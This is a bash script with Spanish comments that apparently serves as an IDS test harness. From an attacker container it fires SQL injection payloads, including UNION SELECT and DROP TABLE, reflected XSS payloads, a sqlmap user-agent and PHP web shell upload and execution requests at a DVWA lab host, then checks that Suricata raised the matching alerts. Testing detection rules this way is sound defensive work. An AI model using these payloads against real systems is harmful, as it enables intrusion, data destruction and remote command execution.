#!/usr/bin/env bash
# ============================================================
# Ataque 4: SQL Injection contra DVWA
#
# Detecta: Suricata rule 1000001 (UNION SELECT)
# Tambien: rules 1000010 (XSS), 1000011 (XSS javascript:), 1000012 (XSS onerror)
# Y: rules 1000020 (PHP web shell), 1000021 (system command)
# ============================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

VICTIM_IP="10.10.10.40"
SOURCE_CONTAINER="attacker"

echo "============================================================"
echo " ATAQUE 4: SQL Injection + XSS + Web Shell upload"
echo "============================================================"
echo "Objetivo: $VICTIM_IP (DVWA en nivel LOW)"
echo ""

# 1. SQL Injection - UNION SELECT (regla 1000001)
echo "[+] 1. SQL Injection: UNION SELECT..."
docker exec "$SOURCE_CONTAINER" curl -s --max-time 15 -A "Mozilla/5.0" \
    -G --data-urlencode "id=1 UNION SELECT 1,user(),database()--" \
    -o /dev/null -w "  UNION SELECT: HTTP %{http_code}\n" \
    "http://$VICTIM_IP/vulnerabilities/sqli/"

docker exec "$SOURCE_CONTAINER" curl -s --max-time 15 -A "Mozilla/5.0" \
    -G --data-urlencode "id=1' OR '1'='1" \
    -o /dev/null -w "  OR 1=1:       HTTP %{http_code}\n" \
    "http://$VICTIM_IP/vulnerabilities/sqli/"

docker exec "$SOURCE_CONTAINER" curl -s --max-time 15 -A "Mozilla/5.0" \
    -G --data-urlencode "id=1; DROP TABLE users--" \
    -o /dev/null -w "  DROP TABLE:    HTTP %{http_code}\n" \
    "http://$VICTIM_IP/vulnerabilities/sqli/"

# 2. XSS - Script tag (regla 1000010)
echo ""
echo "[+] 2. XSS: reflected script tag..."
docker exec "$SOURCE_CONTAINER" curl -s --max-time 15 -A "Mozilla/5.0" \
    -G --data-urlencode "name=<script>alert('XSS')</script>" \
    -o /dev/null -w "  <script>:     HTTP %{http_code}\n" \
    "http://$VICTIM_IP/vulnerabilities/xss_r/"

docker exec "$SOURCE_CONTAINER" curl -s --max-time 15 -A "Mozilla/5.0" \
    -G --data-urlencode "name=<img src=x onerror=alert(1)>" \
    -o /dev/null -w "  onerror:      HTTP %{http_code}\n" \
    "http://$VICTIM_IP/vulnerabilities/xss_r/"

docker exec "$SOURCE_CONTAINER" curl -s --max-time 15 -A "Mozilla/5.0" \
    -G --data-urlencode "name=<a href=javascript:alert(1)>click</a>" \
    -o /dev/null -w "  javascript::   HTTP %{http_code}\n" \
    "http://$VICTIM_IP/vulnerabilities/xss_r/"

# 3. SQLi con sqlmap signature (regla 1000051)
echo ""
echo "[+] 3. SQLi con sqlmap user-agent..."
docker exec "$SOURCE_CONTAINER" curl -s --max-time 15 -A "sqlmap/1.7" \
    -G --data-urlencode "id=1 UNION SELECT 1,2,3--" \
    -o /dev/null -w "  sqlmap:       HTTP %{http_code}\n" \
    "http://$VICTIM_IP/vulnerabilities/sqli/"

# 4. Web shell upload (reglas 1000020, 1000021)
echo ""
echo "[+] 4. Web shell payload..."
docker exec "$SOURCE_CONTAINER" curl -s --max-time 15 -A "Mozilla/5.0" \
    -X POST -F "uploaded=@/etc/hostname;filename=shell.php" \
    -F "Upload=Upload" \
    -o /dev/null -w "  shell upload: HTTP %{http_code}\n" \
    "http://$VICTIM_IP/hackable/uploads/shell.php"

docker exec "$SOURCE_CONTAINER" curl -s --max-time 15 -A "Mozilla/5.0" \
    "http://$VICTIM_IP/hackable/uploads/<?php system(\$_GET['c']); ?>.php?c=id" \
    -o /dev/null -w "  shell exec:   HTTP %{http_code}\n" || true

echo ""
echo "[OK] Ataques SQLi/XSS/WebShell completados"
sleep 5

# Verificar
DETECTIONS=0
for sid in 1000001 1000010 1000051 1000020; do
    if docker exec suricata grep -q "\"signature_id\":$sid" /var/log/suricata/eve.json 2>/dev/null; then
        echo "[OK] Alerta Suricata $sid DETECTADA"
        DETECTIONS=$((DETECTIONS+1))
    fi
done
echo ""
echo "Total alertas Suricata nuevas: $DETECTIONS"